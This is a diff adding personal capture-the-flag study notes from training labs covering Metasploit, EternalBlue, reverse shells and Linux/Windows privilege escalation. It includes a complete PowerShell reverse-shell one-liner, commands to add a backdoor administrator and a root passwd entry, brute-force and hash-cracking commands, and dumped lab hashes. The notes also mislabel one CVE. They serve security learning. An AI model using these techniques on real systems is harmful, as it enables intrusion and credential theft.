@@ -1,0 +1,453 @@
+Complete Beginner Intro
+Windows Exploitation Basics	
+	Active Directory Basics
+		Task 1 - Intro
+		Task 2 - Windows Domains
+		Task 3 - Active Directory
+		Task 4 - Managing Users in AD
+			• First step is to delegate control of the IT department to allow for password resets.
+			• Next step is using RDP to login to an account named Phillip in the THM/ domain
+				○ Phillip has no perms to interact with the GUI AD so I use powershell to reset Sophie's pass and require change on next logon.
+					+ Phillip /could/ be given permission to use the GUI but I assume it's not within his scope of work and therefore disallowed.
+					+ Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+					+ Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
+			• From there I simply RDP into Sophie's computer
+		Task 5 - Managing Computers in AD
+			• Created new OU's (rclick domain, new, OU) and organized the users and servers into their own OU's
+		Task 6 - Group Policies
+			• Exercise updating GPO to lock users from using the control panel among other things
+		Task 7 - Authentication Methods
+		Task 8 - Trees, Forests and Trusts
+		Task 9 - Conclusion
+		
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+
+	Metasploit Intro
+		Task 1 - Intro
+		Task 2 - Main Components of Metasploit
+		Task 3 - msfconsole
+			• I found the provider of /ssh_login module by using search to find it, then info
+		Task 4 - Working with modules
+			• setg/unsetg - set global params
+		
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+
+	Metasploit Exploitation
+		Task 1 - Introduction
+		Task 2 - Scanning
+			• Firstly I need to do a few different types of portscans so my first step is to search for some and choose what I need
+				○ To start I used the tcp portscan, set the relevant params and scanned the system
+					+ Assuming I'll be exclusively scanning this system, I set a global param for RHOSTS
+					+ OPEN PORTS:
+						- 21
+						- 22
+						- 139
+						- 445
+						- 8000
+			• Next question was about NetBIOS information, there were a few options for this but I decided to run nbname on metasploit
+				○ use nbname
+				○ params already set so I just ran it
+				○ This could've been done with UDP_sweep too
+			• Next was finding what service is running on a port, I just decided to run nmap straight in the msfconsole which returned
+				○ nmap -p 8000 -A -vv <ip>
+				○ http_version could've done this too
+			• For this step we were given the username and a wordlist and told to find the password of an SMB user
+				○ I used smb_login module as I've used it before and set the following params:
+					- SMBUser penny
+					- PASS_FILE	/root/msWordlist.txt
+				○ On run I found the pass to be leo123
+		Task 3 - The Metasploit DB
+		Task 4 - Vuln Scanning
+		Task 5 - Exploitation
+			• My first step in exploiting this machine was finding information on it, its ports, etc, so an nmap start started
+				○ PORTS:
+					- 135/tcp RPC
+					- 139/tcp NetBIOS
+					- 445/tcp SMB (Win7!)
+					- 3389/tcp ms-wbt-server
+				○ Name == Jon-PC
+			• With this information I didn't really need anything else, the machine is running an outdated SMB server vuln to eb in 2024 lol
+				I was able to open a meterpreter shell, having set global params earlier it was as easy as setting payload and running.
+					○ I used 'search -f flag.txt' to find the flag and then cat to read it
+			• To find the NTLM hash was a breeze, given I'm already in meterpreter is was as simple as typing 'hashdump' with no flags or params.
+		Task 6 - msfvenom
+			• To begin exploiting this machine I created a tcp reverse shell using msfvenom and then started a webserver to host the file
+				○ To download I used wget http://<ip>:<port>/<path>
+			• As far as configuring the handler, I set a global param for LHOST since that won't change, and the rest was already okay
+				○ NOTE!! I didn't notice originally but the handler was set to shell_reverse_tcp for linux, not reverse_tcp, caused shell to close
+			• With a meterpreter shell open I just run hashdump and get the flag
+				○ Had some issues with hashdump relating to a db, reading the github I just decided to disconnect db for now to fix the issue
+		Task 7 - Summary
+		
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+
+	Metasploit Meterpreter
+		Task 1 - Intro
+		Task 2 - Meterpreter Flavors
+		Task 3 - Meterpreter Commands
+		Task 4 - Post-Exploit w/ Meterpreter
+		Task 5 - Post-Exploit Challenge
+			• First step was getting a meterpreter shell, I used psexec for this, set the params and ran
+				○ For the first question, it was what is the computer name, I used sysinfo for this, this also covered the second question
+			• For the second step I spawned a cmdline shell using the shell command, from there I just used 'net share' to enum the shared folders
+			• Next question is about getting the NTLM hashes, running hashdump shows an error so I had to migrate to LSASS (local security authority..)
+				○ Under the LSASS PID I was able to dump the NTLM hashes
+			• The next one was to crack the NT hash for the JChambers account, I used johntheripper to do so, the command is below:
+				○ john --format=nt --wordlist=<path>/rockyou.txt jchambers_hash.txt
+			• Next is finding the specific path to secrets.txt, there were a handful of methods I could've used but I just used 'search -f secrets.txt'
+				○ Then it was simply using cat to read the file, ensuring to encapsulate it in quotes since there's spaces in the title
+			• The last step is a repeat of the prior step but for realsecret.txt
+		
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Blue (EternalBlue)
+		Since this is a bit more in depth, I'm going to keep a running log of information in recon.txt, appending with echo >>
+		Any information found and logged in this file will be shown here before the tasks (with some formatting):
+		 _________________________________/recon.txt\_______________________________________________
+		/																							\
+		|->	target IP 		== 	10.10.46.178														|
+		|																							|
+		|->	open PORTS 		== 	135/tcp msrpc														|
+		|						139/tcp netbios-ssn													|
+		|					   *445/tcp microsoft-ds (vuln to EB)									|
+		|						3389/tcp ms-wbt-server												|
+		|						49152/tcp msrpc														|
+		|						49153/tcp msrpc														|
+		|						49154/tcp msrpc														|
+		|						49158/tcp msrpc														|
+		|						49159/tcp msrpc														|
+		|																							|
+		|->	hostname		== 	Jon-PC																|
+		|																							|
+		|->	os ver			==	Win7 Pro 7601 SP1 (Win7 6.1)										|
+		|																							|
+		|->	notable PID		==	712 	lsass.exe													|
+		|						2388	svchost.exe													|
+		|						2556	svchost.exe													|
+		|																							|
+		|->	hashes:																					|
+		|	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::	|
+		|	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::			|
+		|	Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::			|
+		|																							|
+		|																							|
+		|																							|
+		\___________________________________________________________________________________________/
+	
+		Task 1 - Recon
+			• First off I nmap scan just to see what's running on the system, you can see the results in my recon.txt file (just shown above)
+		Task 2 - Gain Access
+			• Armed with that information it was as simple as loading the exploit into msfconsole, setting RHOSTS (set globally) and then the payload and running it
+		Task 3 - Escalate
+			• Now getting shell is cool and all, really! But getting meterpreter is cooler B) I use the shell_to_meterpreter module for this
+				○ I first double check the session ID for my shell (it's ID == 1)
+				○ I set the params for session and run the exploit, it autodetects my IP and runs successfully
+				○ To confirm I swap sessions to my DOS shell, run whoami and confirm I have NT AUTHORITY\SYSTEM
+			• After successfuly escalating and confirming I've escalated I switch to my meterpreter shell session
+			• Lastly I migrate to a better process, specifically lsass.exe on process ID 712
+		Task 4 - Cracking
+			• This was an easy one, with the meterpreter shell running on a process with root (NT AUTHORITY\SYSTEM) I just use hashdump to dump the files
+				○ Once dumped I pipe out the NT hash to a file and use johntheripper and rockyou to crack it
+		Task 5 - Find Flags!
+			• I actually read ahead and while cracking the password in a separate session I ran 'search -f *.txt' to search for any flags
+				○ I -no joke- gave this an hour to run while I did other modules with no luck, so I ended it.
+			• Flags:
+				1. Found in the C:\ directory, plaintext
+				2. Found in sys32, found using the hints, plaintext
+				3. Found in Jon's doc folder, plaintext
+				
+====================================================================================================================================
+
+Shells and Privesc
+	What the Shell?
+		Task 1 - Intro
+		Task 2 - Tools
+		Task 3 - Types of Shell
+		Task 4 - Netcat
+		Task 5 - Netcat Shell Stabilization
+		Task 6 - Socat
+		Task 7 - Socat Encrypted Shells
+		Task 8 - Common Shell Payloads
+			• Common PSH one liner
+				○ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+			• Good shell payload resource:
+				○ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+		Task 9 - msfvenom
+			• _ means stageless while / means staged
+		Task 10 - Metasploit multi/handler
+		Task 11 - WebShells
+		Task 12 - Next Steps
+			• Linux places to look:
+				○ /home/<user>/.ssh
+				○ Exploits to write self into /etc/shadow like Dirty C0w
+			• Windows:
+				○ VNC servers
+				○ FTP servers
+				○ if have admin, create own account in admin group, then rdp/telnet/winexe/psexed/etc
+					1. net user <username> <password> /add
+					2. net localgroup administrators <username> /add
+		Task 13 - Practice and Examples
+			• I used the credentials in the next module to practice setting up both reverse and bind shells on the target system, netcat came easier to me but I tried both of them
+			• This went easier on the Linux machine but with referencing the previous documents I was able to get shells working on both machines, other than the php shell which did not work (by design)
+			
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Common Linux Privesc
+		Task 1 - Get Connected
+		Task 2 - Understanding Privesc
+		Task 3 - Direction of Privesc
+		Task 4 - Enumeration
+			• LinEnum - Useful bash script for privesc
+			
+			• For the questions I SSH into the target server and set up a python server on my own to host LinPEAS off of, downloading it to the target.
+			• After downloading I checked the hostname, passwd, crontab and shells file for information pertaining to the questions
+		Task 5 - Abusing SUID/GUID Files
+			• How to manually scan for SUID/SGID binaries:
+				○ find / -perm -u=s -type f 2>/dev/null
+				○ find / -perm -u=g -type f 2>/dev/null
+			• Here I used LinPEAS to scan the system for anything interesting and potential privesc.
+				○ I exported the output for easier viewing back to my attacking machine using scp
+				○ I then used echo and grep to find vulnerable SUID files, using the flag to show lines after a match to quickly search
+					+ cat output.txt | grep -A 40 SUID
+				○ Looking through the files I found an interesting one that's accessible by my current user
+					+ /home/user3/shell
+				○ I ensure it's perms using 'ls -l' first, it is indeed a SUID bit file, running this is the last step of the lesson
+		Task 6 - Exploiting Writeable /etc/passwd
+			• In the previous task I used LinPEAS to find some privescs, I noticed user7 is part of root group and the passwd file is writable by that user
+				○ user7:x:1006:0:user7,,,:/home/user7:/bin/bash
+				○ or: uid=1006(user7) gid=0(root) groups=0(root)
+			• I leverage this by logging in as this user and entering my own creds into the passwd file, first I need to prepare them
+				○ I hash a password to add using openssl
+				○ After that I'm able to recreate what the passwd entry would look like, modeling it after the root entry, and then adding it to the bottom
+					+ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+				○ With that this is complete,  I can now log in as root.
+		Task 7 - Escaping Vi Editor
+			• Swapping to user8 and checking what sudo commands they have access to I notice they have sudo access to vim without providing a passwd
+				○ opening a shell from Vim is as simple as :!sh instead of :!q or whatever you'd typically do to escape that god forsaken text editor
+		Task 8 - Exploiting Crontab
+			• First step is to create the payload, I'll create a reverse shell payload using msfvenom
+			• I already know the script that runs every 5 minutes is in my Desktop folder, but in case I didn't I can grep the output of LinPEAS
+			• Give it 5 minutes and the cronjob will run and open a reverse shell back to my box (unstable)
+		Task 9 - Exploiting PATH Variable
+			• There's a file named script in the user's home directory
+				○ First thing I did was run file script just to get a better idea of what the file is
+				○ Then I just ran the file itself to see what it'd output, I realized then it was emulating the 'ls' command
+			• After that I went to the tmp directory and made an imitation executable and then updated the PATH to include my imitation executable
+				○ Going back and running the script gives me a root shell
+			
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Linux PrivEsc
+		Task 1 - Deploy Vuln Debian
+		Task 2 - Service Exploits
+			• I saw that the mysql service was running as root without a password, I used the raptor_udf (user defined function) exploit to privesc
+				○ This essentially uses mysql to change the SUID bit of the bash file and then copy that to /tmp to run at will
+					+ ./rootbash -p
+		Task 3 - Weak File Perms - Readable /etc/shadow
+			• Next is a readable shadow file, I capture the root user's password with this command
+				○ cat /etc/shadow | grep root > hash.txt
+					+ Use nano to clean it up to just the hash
+			• From here it's just using johntheripper, this is obvious enough as a SHA512crypt with the %6% that I don't need to specify
+		Task 4 - Weak File Perms - Writable /etc/shadow
+			• This one is simple, the shadow file is writable so I just change the password hash to a known one that I made
+				○ mkpasswd -m sha-512 <passwd>
+		Task 5 - Weak File Perms - Writable /etc/passwd
+			• Similar to the last, but with the /etc/passwd file this time, different encryption method but still replacing root's passwd
+				○ openssl passwd <passwd>
+		Task 6 - Sudo - Shell Escape Sequences
+			• Listing which sudo commands I can run as user I see 11 different ones, searching gtfobins I find the first one has a shell escape sequence
+				○ By simply running iftop in sudo, I can then type !/bin/sh to get a root shell
+		Task 7 - Sudo - Environment Variables
+			• Here I leverage inherited env vars, specifically the LD_PRELOAD
+				○ I do this by creating a shared obj with code to unset LD_PRELOAD and instead open a root shell
+				○ Now when I run a sudo command, LD_PRELOAD which is loaded first will instead make a root shell
+			• The next exploit uses the same premise but with LD_LIBRARY_PATH, unsetting the var and replacing it with /bin/bash
+		Task 8 - Cron Jobs - File Perms
+			• Here I find a cronjob that runs every minute that is writable to everyone (perms are 746)
+				○ Instead of establishing root on the machine, I open a reverse shell back to my attackbox with root access, catching the shell with nc
+		Task 9 - Cron Jobs - PATH Env Variable
+			• Next I realize the PATH var is pointing to my home directory. Knowing this I write a cronjob using the name of an existing one
+				○ This cronjob contains the command to copy the bash file to /tmp/rootbash and make it executable WITH an SUID bit
+		Task 10 - Cron Jobs - Wildcards
+			• Looking at the next cronjob, it looks like it makes a backup of the user folder and zips it using tar, storing it in /tmp/backup.tar.gz, 
+				which /tmp is an interesting folder to store backups...
+			• Now I'll abuse the tar wildcard in the cronjob to pass along more args for the tar command, including to execute a tcp reverse shell 
+				back to the attackbox. Caught with nc
+		Task 11 - SUID / SGID Executables - Known Exploits
+			• I do a quick search for SUID/SGID executables, one of them has a local privilege escalation exploit on Exploit-DB, running it gives root
+				○ executable: exim-4.84-3
+				○ cve: CVE-2016-1531
+		Task 12 - SUID / SGID Executables - Shared Object Injection
+			• I find an SUID executable that's vuln to shared obj injection, I use strace to find a shared object that can't be found
+			• With that information I make that object with code inside of it to spawn a bash shell, no need to set perms as it's already SUID
+		Task 13 - SUID / SGID Executables - Environment Variables
+			• For this next SUID file, I run strings on it to find that it's trying to start the apache2 service, running the exec I see it's unable to
+				○ Further research showed the service is missing entirely, so I make a copy with code to open a bash shell and then run the exec again, getting root
+		Task 14 - SUID / SGID Executables - Abusing Shell Features 1
+			• For this I'm exploiting a flaw in bash versions before 4.2-048 where I can make a function that looks like a filepath but still executes commands
+		Task 15 - SUID / SGID Executables - Abusing Shell Features 2
+			• This one abuses a flaw in versions 4.4 and earlier, using the PS4 env var to embed a command to create a bash shell with an SUID bit
+		Task 16 - Passwords & Keys - History Files
+			• Here I'm just parsing bash history to find a password that was accidentally entered
+		Task 17 - Passwords & Keys - Config Files
+			• Here I simply read their openvpn config which leads me to another file with the user/pass
+		Task 18 - Passwords & Keys - SSH Keys
+			• Here I simply nab the root SSH key and use it to log on from my attackbox
+		Task 19 - NFS
+			• To exploit NFS I find a folder without root squashing enabled. 
+			• I then mount the folder directly to my attackbox, after this I use msfvenom to craft a nfs shell payload directly onto the target system, set suid perm and run it for root
+		Task 20 - Kernel Exploits
+			• As a last resort I can always look for kernel exploits, for this I can use Dirty c0w to get root
+			• I compile the code and run the exploit, now the /usr/bin/passwd file will spawn a shell instead of list SUID's
+			
+====================================================================================================================================
+
+Basic Computer Exploitation
+
+====================================================================================================================================
+
+///////////////////////////////////////////////// VULNERVISITY ALREADY COMPLETED \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+	
+====================================================================================================================================
+	
+	Basic Pentesting
+		• As a rule of thumb I always start with an nmap scan, since I may be working with the results a little longer I output it to a greppable file
+			○ nmap -A -vv -oG nOutput.txt -sS <ip>
+				- cat nOutput.txt | grep Ports:
+		• The nmap scan revealed a webserver, knowing that I ran a gobuster scan to find hidden directories
+			○ gobuster -u http://<ip> -w <path>/directory-list-2.3-medium.txt 
+		• Looking in that dir I find some interesting information, confirming what the portscan said, which was this machine is running samba
+			○ Armed with that I used enum4linux to quickly find some usernames, jan and kay
+		• After this I used hydra to bruteforce the ssh login using the username I found (Jan seemed like the easier target based on the j.txt file)
+			○ hydra -P <path>/rockyou.txt -l jan ssh://<ip>
+		• Now that I'm on the system I browse the files a bit, jan's home is empty but in kay's there's two points of interesting
+			○ The first point is always a good place to start, .ssh, which I find has an id_rsa file which I copy back to my machine using a python http server
+				- Just need to be sure I'm using wget on MY python webserver and not the webserver running on port 8080 already
+			○ Next is a pass.bak file which I find I don't have access for, no worries I already have Kay's SSH key
+		• Simply getting id_rsa isn't enough, I have to crack it, I use ssh2john to prep it and then crack the output with rockyou, getting the password beeswax
+		• I originally attempted to SSH from my own machine but realized that doesn't work so I went in through jan's machine with kay's id_rsa and got the final flag
+			
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Kenobi
+		Enumerating samba
+			• Same start as normal, I run an nmap scan and find 7 ports are open
+				○ Of interest is a samba port (SMB basically)
+			• nmap has built-in smb enumerator scripts, I run two to enum users and shares respectively
+				○ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.0.236
+					+ 3 shares
+			• I connect to one of the shares, which required no password (shown in the enum - ANONYMOUS ACCESS: READ/WRITE)
+				○ I open the log.txt file with more and read through it, discovering user kenobi owns the FTP process
+			• Next I enum their network file system using nmap as well (nfs-ls,nfs-statfs,nfs-showmount)
+				○ I find /var is the mount for nfs
+		Gain Access via ProFTPd
+			• After this I use netcat to inspect the FTP port and find the type of FTP server and versions
+				○ ProFTPd v1.3.5
+			• With this in hand I want to see if there's any vulns for that version, I use searchsploit for this
+			• The vulnerability that I found allows me to simply feed SITE CPFR and SITE CPTO to copy and move files
+				○ I use this to move the ssh key from Kenobi's .ssh folder to a folder on /var, which is a mountable drive
+			• With the drive mounted I grab Kenobi's SSH key and use it to log in via ssh, no passwd required
+		Privesc via $PATH
+			• Once on the system I look for any SUID
+				○ find / -perm -u=s -type f 2>/dev/null
+					+ /usr/bin/menu
+			• Using strings I find that this file isn't using full paths, so I can change what it runs by changing the PATH
+				○ To do this I copy the sh command (full path) into a new file named curl
+				○ I update the PATH to my version of curl
+			• With the path updated all that's required is running the menu file which will open a root shell
+						
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+	
+	Steel Mountain
+		Introduction
+			• Ironically I knew the guy's name for Employee of the Month already, but I used inspect element to confirm
+		Initial Access
+			• I already had an idea there's a webserver running too, so I ran nmap and gobuster at the same time (loud I know)
+				○ nmap -vv -sS -A <ip>
+				○ gobuster -u <ip> -w <path>/<directory wordlist> dir
+			• With my nmap scan I realized there's a second website being ran on port 8080
+				○ I was going to inspect element to find the file server type, but there's a link to it at the bottom, rejetto
+			• Armed with the exploit I launch metasploit and use the rejetto vuln, after setting params and running, I get a shell
+				○ I need to set RHOSTS and RPORT (since it's not on default port 80)
+			• With a meterpreter shell open, I use the shell command to get a DOS shell and read the flag (normal shell had encoding err)
+		Privesc
+			• I background the DOS shell to get back to Meterpreter and upload a powershell exploit to enumerate the machine
+				○ Going into Powershell I'm able to execute the script
+			• Executing the script shows me the service AdvancedSystemCareService9 has an unquoted service path that I can restart manually
+			• I craft a reverse shell using msfvenom and upload it to the machine
+				○ I upload it to the machine and move it to the unquoted part of the directory, naming it Advanced.exe to trick the service
+				○ I run sc stop then sc start to get the shell
+		Access & Escalation w/o Metasploit
+			• For this I won't be using Metasploit but I'll still be using the same rejetto CVE-2016-1531 but execution (2)
+				○ Because of this I need to manually set params like RHOSTS (ip_addr) and RPORTS (local_port)
+				○ I also need to download netcat for windows, I grab it off github and rename it to nc.exe for the exploit
+			• The next step is the run the exploit and get a shell, then I connect back and download WinPEAS from my server
+			• From there it's a repeat of the same steps I did with metasploit
+			
+
+
+
+
+
+
+
+
+
+
+
+	--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--
+
+
+====================================================================================================================================
+
+//////////////////////////////////////////// PLACEHOLDERRRRRRRRRRRRRRRRRRRRRRRRRRRRRR \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+	
+====================================================================================================================================
+	
+
+		Task 1 - 
+			• 
+		Task 2 - 
+			• 
+		Task 3 - 
+			• 
+		Task 4 - 
+			• 
+		Task 5 - 
+			• 
+		Task 6 - 
+			• 
+		Task 7 - 
+			• 
+		Task 8 - 
+			• 
+		Task 9 - 
+			• 
+		Task 10 - 
+			• 
+		Task 11 - 
+			• 
+		Task 12 - 
+			• 
+		Task 13 - 
+			• 
+		Task 14 - 
+			• 
+		Task 15 - 
+			• 
+		Task 16 - 
+			• 
+		Task 17 - 
+			• 
+		Task 18 - 
+			• 
+		Task 19 - 
+			• 
+		Task 20 - 
+			• 
+		Task 21 - 
+			• 
+		Task 22 - 
+			• 
+		Task 23 - 
+			• 
